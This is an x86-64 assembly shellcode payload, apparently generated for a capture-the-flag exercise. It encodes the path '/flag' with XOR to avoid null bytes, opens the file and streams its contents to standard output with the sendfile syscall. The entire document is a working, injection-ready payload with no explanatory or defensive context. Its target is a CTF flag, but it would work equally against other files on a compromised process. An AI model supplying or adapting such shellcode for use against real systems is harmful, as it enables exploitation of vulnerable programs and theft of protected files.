.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.intel_syntax noprefix
.p2align 0
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 2 /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    syscall
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 40 /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall
